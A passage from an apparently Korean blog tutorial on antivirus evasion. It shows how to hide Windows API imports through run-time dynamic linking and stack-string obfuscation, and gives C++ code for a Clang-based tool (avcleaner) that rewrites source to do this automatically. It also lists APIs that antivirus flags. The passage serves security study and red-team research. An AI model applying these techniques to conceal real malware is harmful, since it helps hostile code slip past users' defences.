207   │ 203  0x00003ca8 0x004086a8 11  12   .idata        ascii   MessageBoxA 208   │ 204  0x00003d10 0x00408710 12  13   .idata        ascii   KERNEL32.dll 209   │ 205  0x00003d84 0x00408784 10  11   .idata        ascii   msvcrt.dll 210   │ 206  0x00003d94 0x00408794 10  11   .idata        ascii   USER32.dll...9557   │ 9553 0x0004f481 0x00458e81 30  31                 ascii   .refptr.__native_startup_state9558   │ 9554 0x0004f4a0 0x00458ea0 11  12                 ascii   __ImageBase9559   │ 9555 0x0004f4ac 0x00458eac 11  12                 ascii   MessageBoxA9560   │ 9556 0x0004f4b8 0x00458eb8 12  13                 ascii   GetLastError9561   │ 9557 0x0004f4c5 0x00458ec5 17  18                 ascii   __imp_MessageBoxA9562   │ 9558 0x0004f4d7 0x00458ed7 23  24                 ascii   GetSystemTimeAsFileTime9563   │ 9559 0x0004f4ef 0x00458eef 22  23                 ascii   mingw_initltssuo_force9564   │ 9560 0x0004f506 0x00458f06 19  20                 ascii   __rt_psrelocs_start</code></pre><p>이 함수를 <code>User32.dll</code> 라이브러리에서 가져와야 하므로 MessageBoxA 문자열은 3번 나타난다.(뒤에서 자세히 설명)</p><p>MessageBoxA 문자열은 안티바이러스에서 감지되지 않지만 다음 API들은 감지될 것이다.</p><ul><li>InternetReadFile</li><li>ShellExecute</li><li>CreateRemoteThread</li><li>OpenProcess</li><li>ReadProcessMemory</li><li>WriteProcessMemory</li><li>…</li></ul><h2 id="API-imports-숨기기"><a href="#API-imports-숨기기" class="headerlink" title="API imports 숨기기"></a>API imports 숨기기</h2><p>윈도우 시스템에서 개발자들이 외부 라이브러리 함수를 호출하는 데 사용할 수 있는 방법들은 다음과 같다.</p><ul><li>Load-time dynamic linking</li><li>Run-time dynamic linking</li></ul><h3 id="Load-time-dynamic-linking"><a href="#Load-time-dynamic-linking" class="headerlink" title="Load-time dynamic linking"></a>Load-time dynamic linking</h3><p>외부 라이브러리 함수를 호출하는 기본적인 방법이며 링커에 의해 자동적으로 처리된다. 빌드 사이클 동안 애플리케이션은 각 동적 링크 라이브러리(DLL)의 import library(.lib)에 연결된다. 가져온 각 함수에 대해 링커는 DLL에 대한 내용을 IAT에 엔트리를 작성한다.</p><p>애플리케이션이 시작될 때, 운영체제는 IAT를 탐색하여 프로세스의 주소 공간에 있는 모든 라이브러리 리스트를 매핑하고 가져온 각 함수의 주소는 DLL의 Export Address Table에 해당 엔트리를 가리키도록 업데이트된다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/0.png"></p><p>Import Address Table (IAT)</p><h3 id="Run-time-dynamic-linking"><a href="#Run-time-dynamic-linking" class="headerlink" title="Run-time dynamic linking"></a>Run-time dynamic linking</h3><p>다른 방법은 LoadLibrary로 해당 라이브러리를 로드한 후 GetProcAddress로 함수의 주소를 얻어 수동적으로 수행하는 것이다. 예를 들어 위의 예시를 run-time dynamic linking을 적용할 수 있다.</p><p>먼저 MessageBoxA API의 함수 포인터를 정의해야 한다. 시작하기 전에 C의 함수 포인터 구문에 대해 간단하게 설명한다.</p><pre><code class="hljs cpp">&lt;<span class="hljs-keyword">return</span> type&gt; (*&lt;your pointer name&gt;)(arg1, arg2, ...);</code></pre><p>볼 수 있듯이 star operator(함수 포인터이므로)와  괄호를 제외하면 함수를 정의하는 구문과 같다.</p><p>이제 MessageBox의 프로토타입이 필요한데 Windows SDK의 <code>winuser.h</code> 혹은 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">MSDN</a>에서 찾을 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MessageBox</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>앞서 말한 함수 포인터 구문은 정확한 정보로 업데이트할 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> (*_MessageBoxA)(    HWND hWnd,    LPCTSTR lpText,    LPCTSTR lpCaption,    UINT uType);</code></pre><p>MSDN은 이 함수가 <code>User32.dll</code>에서 내보내진 다고 설명한다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/1.png"></p><p>MessageBoxA API는 <code>User32.dll</code>에서 내보내 진다. 따라서 애플리케이션은 이 라이브러리를 먼저 로드해야 한다.</p><pre><code class="hljs cpp">HANDLE hUser32 = LoadLibrary(<span class="hljs-string">&quot;User32.dll&quot;</span>);</code></pre><p>그 후 <code>GetProcAddress</code>를 사용하여 위에서 정의한 함수 포인터에 정확한 주소를 할당할 수 있다.</p><pre><code class="hljs cpp">_MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);</code></pre><p>여기서 원래 예를 <code>MessageBoxA</code> 대신 <code>fMessageBoxA</code>를 호출하도록 수정해야 하며 다음과 같다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    HANDLE hUser32 = LoadLibraryA(<span class="hljs-string">&quot;User32.dll&quot;</span>);    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>HWND, LCTSTR, UINT</code> 데이터 타입을 위해 <code>Windows.h</code> include가 필요하다. 이 간단한 예제를 빌드하고 실행하면 예상대로 alert box가 실행된다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/2.png"></p><p>run-time dynamic linking을 하기 위해 <code>LoadLibrary</code>와 <code>GetProcAddress</code>을 사용하는 간단한 예시</p><h3 id="최종-적용"><a href="#최종-적용" class="headerlink" title="최종 적용"></a>최종 적용</h3><p><code>strings toto.exe</code>를 실행하면 아직 <code>User32.dll</code>과 <code>MessageBoxA</code> 문자열이 나타난다. 이 문자열들은 암호화되어야 하지만 이전 글에서 보여준 간단한 난독화 트릭으로 안티바이러스 탐지를 우회할 수 있다. 최종 결과는 다음과 같다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    <span class="hljs-keyword">char</span> user32[] = &#123;<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hUser32 = LoadLibraryA(user32);    <span class="hljs-keyword">char</span> messabox[] = &#123;<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, messabox);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>이번에는 <code>strings</code>와 <code>rabin2</code> 둘 다 문자열을 찾을 수 없다.</p><pre><code class="hljs cpp">➜  x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe➜  strings /tmp/toto.exe | grep MessageBox➜  rabin2 -zz /tmp/toto.exe | grep MessageBox➜</code></pre><h2 id="자동화된-소스-코드-리팩터링"><a href="#자동화된-소스-코드-리팩터링" class="headerlink" title="자동화된 소스 코드 리팩터링"></a>자동화된 소스 코드 리팩터링</h2><p>이전 글에 설명된 것과 같은 방법으로 기존 코드 베이스를 refactoring 하여 의심스러운 API를 런타임에 로드하고 Import Address Table에서 제거할 수 있다. <code>libTooling</code>으로 구현된 기존의 작업을 기반으로 할 것이다.</p><p>이 작업을 다음과 같이 나열해보자.</p><ul><li>이전 예제의 추상 구문 트리를 생성해라. 함수 호출을 수정하기 위해 노드를 조작하는 방법을 이해하는데 필요하다.</li><li><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>를 사용하여 지정된 API에 대한 API 코드 베이스의 모든 함수 호출을 찾아라.</li><li>다른 함수 식별자로 모든 호출을 대체해라.</li><li>각 함수 호출 전에 <code>LoadLibrary/GetProcAddress</code> 호출을 삽입하라.</li><li>작동하는지 확인해라.</li><li>모든 의심스러운 API를 종합하고 난독화해라.</li></ul><h3 id="MessageBox-애플리케이션의-추상-구문-트리"><a href="#MessageBox-애플리케이션의-추상-구문-트리" class="headerlink" title="MessageBox 애플리케이션의 추상 구문 트리"></a>MessageBox 애플리케이션의 추상 구문 트리</h3><p>원본 MessageBox 애플리케이션의 Clang 추상 구문 트리를 보기 위해 당신의 Windows SDK 경로를 적용하여 스크립트를 사용하자</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/dev/avcleaner&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><pre><code class="hljs bash">bash clang-astdump.sh <span class="hljs-built_in">test</span>/messagebox_simple.c &gt; <span class="hljs-built_in">test</span>/messagebox_simple.c.ast</code></pre><p><img src="/2020/12/13/idioth/av_evasion_part2/3.png"></p><p>MessageBoxA API를 호출하는 간단한 애플리케이션의 Clang 추상 구문 트리</p><p>CallExpr 유형의 AST 노드를 찾으면 소스 코드에서의 함수 호출을 찾을 수 있다. 위 사진에 나와있는 것처럼 실제 호출되는 함수 이름은 하위 노드 중 하나에 지정되어 있으므로 나중에 접근할 수 있어야 한다.</p><h3 id="특정-API의-함수-호출-찾기"><a href="#특정-API의-함수-호출-찾기" class="headerlink" title="특정 API의 함수 호출 찾기"></a>특정 API의 함수 호출 찾기</h3><p><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>는 특정 함수에 대한 모든 함수 호출을 열거하는데 필요하다. 우선 이전 글에서 사용된 것보다 더 복잡하므로 이 matcher에 맞는 구문을 얻는 것이 중요하다. 적합한 것을 찾기 위해서 소스 코드에서 custom query를 실행할 수 있는 interactive tool인 <code>clang-query</code>를 사용했다. 흥미롭게도 이것은 libTooling 기반이고 이 글에서 보여준 어떤 것보다 훨씬 강력하다.</p><pre><code class="hljs bash">clang-query&gt; match callExpr(callee(functionDecl(hasName(<span class="hljs-string">&quot;MessageBoxA&quot;</span>))))Match <span class="hljs-comment">#1:</span>/Users/vladimir/dev/scrt/avcleaner/<span class="hljs-built_in">test</span>/messagebox_simple.c:6:5: note: <span class="hljs-string">&quot;root&quot;</span> binds here    MessageBoxA(NULL, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~1 match.clang-query&gt;</code></pre><p>시행착오와 명령 줄 완성(tab completion)으로 빠르게 작업 솔루션에 접근할 수 있었다. matcher가 잘 동작하는 것을 확인했으니 이전 글에서 수행한 것과 같은 새로운 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>를 생성할 수 있다. <code>clang-query</code>를 사용하여 수행한 것을 C++ 재현하는 것이다.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiCallConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    ApiCallConsumer(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiName, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeDef, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Library)            : _ApiName(<span class="hljs-built_in">std</span>::move(ApiName)), _TypeDef(<span class="hljs-built_in">std</span>::move(TypeDef)), _Library(<span class="hljs-built_in">std</span>::move(Library)) &#123;&#125;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;                <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> AVObfuscator;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[ApiCallObfuscation] Registering ASTMatcher for &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">ApiMatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter, _ApiName, _TypeDef, _Library)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = callExpr(callee(functionDecl(hasName(_ApiName)))).bind(<span class="hljs-string">&quot;callExpr&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;<span class="hljs-keyword">private</span>:    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _ApiName;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _TypeDef;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _Library;&#125;;</code></pre><p>중요한 구현 세부 사항은 많은 다른 함수들에 적용할 수 있는 가능성을 제공하는 것이고 최종적인 목표는 각 수정된 API 함수에 <code>LoadLibrary/GetProcAddress</code>를 삽입하는 것이므로 함수 프로토타입과 DLL 이름을 제공해야 한다.</p><p>그렇게 하면 수정할 API만큼 많은 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumers</a>를 등록할 수 있다. 이 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>의 인스턴스화는 <a href="https://clang.llvm.org/doxygen/classclang_1_1FrontendAction.html">ASTFrontendAction</a>에서 수행되야만 한다:</p><p><img src="/2020/12/13/idioth/av_evasion_part2/4.png"></p><p><code>main.cpp</code>의 주요 변경점.</p><p>이것은 이전 글에서 작업한 기존 코드에 대한 유일한 변경점이다. 우리가 추가할 코드들은 <code>ApiMatchHandelr.cpp</code>를 만드는 것부터 시작한다.</p><p>matcher는 콜백 함수와 함께 제공되므로 다음 하나를 제공하자.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ApiMatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Found &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *CallExpression = Result.Nodes.getNodeAs&lt;clang::CallExpr&gt;(<span class="hljs-string">&quot;callExpr&quot;</span>);    handleCallExpr(CallExpression, Result.Context);&#125;</code></pre><p>섹션의 시작 부분에서 리스트로 분리된 작업들은 아래 메소드를 통해 코드로 바꿀 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span></span>;<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span></span>;<span class="hljs-keyword">bool</span>addGetProcAddress(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,                    <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName);<span class="hljs-function">clang::SourceRange <span class="hljs-title">findInjectionSpot</span><span class="hljs-params">(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> clang::CallExpr &amp;Literal, <span class="hljs-keyword">uint64_t</span> Iterations)</span></span>;</code></pre><h3 id="함수-호출-대체"><a href="#함수-호출-대체" class="headerlink" title="함수 호출 대체"></a>함수 호출 대체</h3><p>이것은 가장 사소한 부분이다. 목표는 AST의 <code>MessageBoxA</code>를 무작위 식별자로 대체하는 것이다. 이러한 무작위 변수 초기화는 다음 섹션에서 수행된다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span> </span>&#123;    <span class="hljs-comment">// generate a random variable name</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = Utils::translateStringToIdentifier(_ApiName);    <span class="hljs-comment">// inject Run-time dynamic linking</span>    <span class="hljs-keyword">if</span> (!addGetProcAddress(CallExpression, pContext, Replacement, _ApiName))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-comment">// MessageBoxA -&gt; random identifier generated above</span>    <span class="hljs-keyword">return</span> replaceIdentifier(CallExpression, _ApiName, Replacement);&#125;</code></pre><p><a href="https://clang.llvm.org/doxygen/Rewriter_8h_source.html#l00164">ReplaceText</a> Clagn API는 함수 식별자의 이름을 변경하는 데 사용된다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;ASTRewriter-&gt;ReplaceText(CallExpression-&gt;getBeginLoc(), ApiName.length(), NewIdentifier);&#125;</code></pre><h3 id="LoadLibrary-GetProcAddress-삽입"><a href="#LoadLibrary-GetProcAddress-삽입" class="headerlink" title="LoadLibrary/GetProcAddress 삽입"></a>LoadLibrary/GetProcAddress 삽입</h3><p>우리가 추가하고자 하는 API에 Run-time dynamic linking을 추가하는 과정은 다음과 같다:</p><ul><li><p>translation unit의 상단 혹은 enclosing 함수 안에 API 프로토타입을 추가해라. 쉽게 하기 위해 우리는 후자를 선택하지만 동일한 함수에서 API를 여러 번 호출할 경우 이미 추가되었는지 확인할 필요가 있다.</p></li><li><p>아래 라인을 추가해라</p><p>  <code>HANDLE &lt;random identifier&gt; LoadLibrary(&lt;library name&gt;);</code></p></li><li><p><code>GetProcAddress</code> 호출을 추가해라</p></li></ul><p>물론 이 작업을 하면서 문자열 리터럴을 삽입하지 않기 위해 각 문자열을 스택 문자열로 작성해야 한다. 이것은 코드를 읽기 지루하게 만들지만 복잡하진 않다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::addGetProcAddress</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName)</span> </span>&#123;    SourceRange EnclosingFunctionRange = findInjectionSpot(pContext, clang::ast_type_traits::DynTypedNode(),                                                           *pCallExpression, <span class="hljs-number">0</span>);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">stringstream</span> Result;    <span class="hljs-comment">// add function prototype if not already added</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">std</span>::find(TypedefAdded.begin(), TypedefAdded.end(), pCallExpression-&gt;getDirectCallee()) == TypedefAdded.end()) &#123;        Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; _TypeDef &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;    <span class="hljs-comment">// add LoadLibrary with obfuscated strings</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryVariable = Utils::translateStringToIdentifier(_Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryString = Utils::generateVariableDeclaration(LoadLibraryVariable, _Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryHandleIdentifier = Utils::translateStringToIdentifier(<span class="hljs-string">&quot;hHandle_&quot;</span>+_Library);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; LoadLibraryString &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\tHANDLE &quot;</span> &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot; = LoadLibrary(&quot;</span> &lt;&lt; LoadLibraryVariable &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    <span class="hljs-comment">// add GetProcAddress with obfuscated string: TypeDef NewIdentifier = (TypeDef) GetProcAddress(handleIdentifier, ApiName)</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameIdentifier = Utils::translateStringToIdentifier(ApiName);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameDecl = Utils::generateVariableDeclaration(ApiNameIdentifier, ApiName);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; ApiNameDecl &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\t_ &quot;</span>&lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; NewIdentifier &lt;&lt; <span class="hljs-string">&quot; = (_&quot;</span> &lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot;) GetProcAddress(&quot;</span>           &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ApiNameIdentifier &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    TypedefAdded.push_back(pCallExpression-&gt;getDirectCallee());    <span class="hljs-comment">// add everything at the beginning of the function.</span>    <span class="hljs-keyword">return</span> !(ASTRewriter-&gt;InsertText(EnclosingFunctionRange.getBegin(), Result.str()));&#125;</code></pre><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/scrt/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..</code></pre><p>전부 잘 동작하는지 테스트하기 위해 아래 테스트 파일을 사용하자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Another test&quot;</span>, <span class="hljs-string">&quot;Another something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>obfuscator 실행!</p><pre><code class="hljs cpp">./CMakeBuild/avcleaner.bin test/messagebox_simple.c --strings=<span class="hljs-literal">true</span> --api=<span class="hljs-literal">true</span> -- -D _WIN64 -D _UNICODE -D UNICODE -D _WINSOCK_DEPRECATED_NO_WARNINGS\ -I /usr/local/Cellar/llvm/<span class="hljs-number">9.0</span><span class="hljs-number">.1</span>\ -I /Users/vladimir/dev/scrt/avcleaner/Include/msvc<span class="hljs-number">-14.15</span><span class="hljs-number">.26726</span>-include\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span 